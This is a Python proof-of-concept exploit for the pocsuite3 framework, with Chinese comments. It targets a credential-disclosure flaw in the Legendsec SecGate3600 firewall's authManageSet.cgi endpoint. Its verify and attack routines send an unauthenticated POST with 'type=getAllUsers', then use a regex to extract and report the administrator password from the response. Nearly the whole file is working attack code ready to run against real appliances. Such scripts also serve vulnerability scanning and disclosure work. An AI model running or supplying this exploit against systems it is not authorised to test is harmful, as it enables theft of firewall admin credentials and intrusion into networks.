#!/usr/bin/env python
# coding: utf-8
from collections import OrderedDict
from urllib.parse import urljoin
import re,random,hashlib,base64
from pocsuite3.api import POCBase, Output, register_poc, logger, requests, OptDict, OptString, VUL_TYPE
from pocsuite3.api import REVERSE_PAYLOAD, POC_CATEGORY


class POC(POCBase):
    vulID = '0'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1'  #默认为1
    author = ['']  #  PoC作者的大名
    vulDate = '2023-12-11'  #漏洞公开的时间,不知道就写今天
    createDate = '2023-12-11'  # 编写 PoC 的日期
    updateDate = '2023-12-11'  # PoC 更新的时间,默认和编写时间一样
    references = ['']  # 漏洞地址来源,0day不用写
    name = '网神SecGate3600防火墙authManageSet.cgi信息泄露漏洞'  # PoC 名称
    appPowerLink = ''  # 漏洞厂商主页地址
    appName = ''  # 漏洞应用名称
    appVersion = ''''''  # 漏洞影响版本
    vulType = VUL_TYPE.LOGIN_BYPASS #漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        网神SecGate3600防火墙/cgi-bin/authUser/authManageSet.cgi 信息泄露 泄露管理员账号密码
    '''
  # 漏洞简要描述
    samples = ['']  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = ['']  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    pocDesc = '''
    检测:pocsuite -r .\poc++.py -u url(-f url.txt) --verify 
    '''
    category = POC_CATEGORY.EXPLOITS.REMOTE

    def _verify(self):
        result={}
        path ="/cgi-bin/authUser/authManageSet.cgi"
        headers={
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
        }
        data = 'type=getAllUsers'
        try:
            resq = requests.post(url=self.url+path,headers=headers,data=data,timeout=10,verify=False)
            if  resq.status_code == 200 and '管理员' in resq.text:
                pattern = re.compile(u'(?<=admin</cell>\n<cell>)(.+)(?=</cell>)')
                admin_passowrd = pattern.search(resq.text).group(0)
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url + path
                result['VerifyInfo']['password'] = 'admin' +','+admin_passowrd
        except Exception as e:
            return
        return self.parse_output(result)         

    def _attack(self):
        return self._verify()
    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _shell(self):
        return

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
    
register_poc(POC)